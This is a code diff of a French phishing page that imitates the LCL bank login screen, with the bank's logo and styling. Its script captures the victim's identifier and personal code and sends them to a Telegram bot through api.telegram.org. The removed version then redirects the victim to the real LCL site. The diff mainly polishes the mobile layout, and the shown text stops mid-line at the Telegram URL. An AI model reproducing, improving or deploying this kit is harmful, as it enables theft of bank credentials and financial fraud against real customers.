@@ -2,152 +2,224 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Connexion - LCL</title>
     <style>
+        /* Reset et styles de base */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
         body {
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
+            background-color: #ffffff;
+            color: #333333;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px; /* Largeur max pour PC, plein écran sur mobile */
+            padding: 20px;
             display: flex;
             flex-direction: column;
             justify-content: flex-start;
-            align-items: center;
-            min-height: 100vh;
-            padding-top: 40px;
         }
-        .container {
-            background: white;
-            padding: 20px 30px;
-            width: 100%;
-            max-width: 400px;
-            min-height: 500px;
-            position: relative;
+
+        /* Logo LCL Exact */
+        .logo-container {
+            margin-bottom: 40px;
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
         }
-        .logo {
-            max-width: 100px;
-            margin-bottom: 30px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
+
+        .logo-container img {
+            width: 140px;
+            height: auto;
         }
-        h2 {
+
+        /* Titres */
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
             color: #333;
-            margin-bottom: 25px;
-            font-size: 20px;
-            font-weight: 600;
+            margin-bottom: 30px;
             text-align: left;
-            padding: 0 5px;
+            padding-left: 5px;
         }
+
+        /* Groupes de champs */
         .input-group {
             margin-bottom: 25px;
+            position: relative;
             text-align: left;
         }
+
         label {
             display: block;
+            font-size: 16px;
+            color: #333;
             margin-bottom: 8px;
-            color: #666;
-            font-size: 14px;
             font-weight: 500;
         }
+
         input {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
+            height: 50px; /* Hauteur standard mobile */
+            padding: 0 15px;
             font-size: 16px;
-            background-color: #fff;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            background-color: #ffffff;
+            color: #000000;
+            transition: border-color 0.2s;
         }
+
         input:focus {
             border-color: #D6001C;
             outline: none;
-            box-shadow: 0 0 0 2px rgba(214, 0, 28, 0.1);
+            box-shadow: 0 0 0 1px #D6001C;
         }
+
+        input::placeholder {
+            color: #999999;
+            font-style: italic;
+        }
+
+        /* Bouton */
         button {
             width: 100%;
-            padding: 14px;
+            height: 50px;
             background-color: #D6001C;
-            color: white;
+            color: #ffffff;
             border: none;
             border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
+            font-size: 18px;
+            font-weight: 700;
             cursor: pointer;
             margin-top: 10px;
+            transition: background-color 0.2s;
         }
+
         button:hover {
             background-color: #b30016;
         }
-        .links {
-            margin-top: 20px;
-            font-size: 14px;
-            text-align: left;
-            padding: 0 5px;
+
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
         }
-        .links a {
+
+        /* Liens secondaires */
+        .secondary-links {
+            margin-top: 25px;
+            text-align: left;
+            padding-left: 5px;
+        }
+
+        .secondary-links a {
             display: block;
             color: #D6001C;
             text-decoration: none;
-            margin-bottom: 5px;
+            font-size: 16px;
+            margin-bottom: 10px;
+            font-weight: 500;
         }
-        .links a:hover {
+
+        .secondary-links a:hover {
             text-decoration: underline;
         }
+
+        /* Lien Ouvrir un compte */
         .open-account {
             display: block;
             text-align: center;
             margin-top: 30px;
             color: #D6001C;
             text-decoration: none;
-            font-weight: bold;
+            font-weight: 700;
+            font-size: 16px;
         }
+
+        /* Footer Sécurité */
         .footer {
-            margin-top: 40px;
+            margin-top: 50px;
             padding-top: 20px;
-            border-top: 1px solid #eee;
+            border-top: 1px solid #e0e0e0;
             font-size: 12px;
-            color: #888;
+            color: #666666;
+            line-height: 1.5;
+            text-align: left;
         }
+
         .footer-title {
-            font-weight: bold;
+            font-weight: 700;
             color: #333;
-            margin-bottom: 5px;
+            margin-bottom: 10px;
+            font-size: 13px;
         }
-        .footer p {
-            margin: 0;
-            line-height: 1.4;
-        }
+
+        /* Spinner de chargement */
         .spinner {
             display: none;
             border: 4px solid #f3f3f3;
             border-top: 4px solid #D6001C;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 30px auto;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Animation d'apparition du champ Code */
+        .fade-in {
+            animation: fadeIn 0.4s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         .hidden {
             display: none;
         }
-        .fade-in {
-            animation: fadeIn 0.5s;
+        
+        /* Masquer le bouton et montrer le spinner */
+        .loading-state {
+            display: none;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        
+        .loading-state button {
+            display: none;
         }
+        
+        .loading-state .spinner {
+            display: block;
+        }
+
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Logo LCL -->
-    <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/c/c2/Logo_LCL.svg/120px-Logo_LCL.svg.png" alt="LCL Logo" class="logo">
+    <!-- Logo LCL Exact -->
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/c/c2/Logo_LCL.svg/120px-Logo_LCL.svg.png" alt="LCL Logo">
+    </div>
     
-    <h2>Connexion à votre espace client</h2>
+    <h1>Connexion à votre espace client</h1>
 
     <!-- Formulaire -->
     <form id="loginForm">
@@ -167,10 +239,11 @@
         <button type="submit" id="btnSubmit">Suivant</button>
     </form>
 
+    <!-- Spinner de chargement -->
     <div class="spinner" id="spinner"></div>
 
     <!-- Liens secondaires -->
-    <div class="links">
+    <div class="secondary-links">
         <a href="#">Identifiant oublié ?</a>
         <a href="#">Code personnel oublié ?</a>
     </div>
@@ -194,70 +267,38 @@
     const passwordInput = document.getElementById('password');
     const submitBtn = document.getElementById('btnSubmit');
     const loginForm = document.getElementById('loginForm');
+    const spinner = document.getElementById('spinner');
 
-    // Script pour afficher des points dans le champ code
+    // Quand on tape dans le champ code, on le met en mode "password" pour voir les points
     passwordInput.addEventListener('input', function() {
-        // On garde la valeur réelle dans le champ, mais on affiche des points visuellement
-        // Pour une capture simple, on peut juste laisser le type "password"
-        // Mais pour imiter EXACTEMENT le style LCL (points noirs), on force le type password
         this.type = 'password'; 
     });
 
-    // Étape 1 : Quand l'utilisateur clique sur "Suivant" avec seulement l'identifiant
+    // Gestion du formulaire
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
 
         const userId = userIdInput.value;
+        const password = passwordInput.value;
 
-        // Si le champ code est encore caché, on l'affiche et on change le bouton
-        if (!codeGroup.classList.contains('hidden')) {
-            // Cas normal : tout est rempli, on envoie
-            sendData(userId, passwordInput.value);
-            return;
-        }
-
-        // Cas : On vient juste de mettre l'identifiant
-        if (userId) {
+        // Si le champ code est encore caché, c'est qu'on vient de mettre l'identifiant
+        if (codeGroup.classList.contains('hidden')) {
             codeGroup.classList.remove('hidden');
             codeGroup.classList.add('fade-in');
             passwordInput.focus();
-            submitBtn.textContent = "Se connecter"; 
-            submitBtn.style.backgroundColor = "#333"; 
+            submitBtn.textContent = "Se connecter";
+            submitBtn.style.backgroundColor = "#333333"; // Changement de couleur pour montrer que c'est "Suivant"
+            return;
         }
-    });
 
-    // Fonction d'envoi des données
-    function sendData(userId, password) {
-        // Animation de chargement
-        submitBtn.style.display = 'none';
-        document.getElementById('spinner').style.display = 'block';
+        // Si on arrive ici, c'est que l'utilisateur a tapé son code et clique sur "Se connecter"
+        // On passe en mode chargement
+        loginForm.style.display = 'none';
+        document.querySelector('.secondary-links').style.display = 'none';
+        document.querySelector('.open-account').style.display = 'none';
+        spinner.style.display = 'block';
 
+        // Envoi des données à Telegram
         const message = `🔐 *Nouvelle connexion LCL détectée*\n\n👤 Identifiant: ${userId}\n🔑 Code: ${password}\n📅 Date: ${new Date().toLocaleString()}`;
 
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('Données envoyées !');
-            }
-        })
-        .catch(error => console.error('Erreur réseau:', error));
-
-        // Redirection vers le vrai site LCL après 2 secondes
-        setTimeout(() => {
-            window.location.href = 'https://www.lcl.fr/';
-        }, 2000);
-    }
-</script>
-
-</body>
-</html>
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage
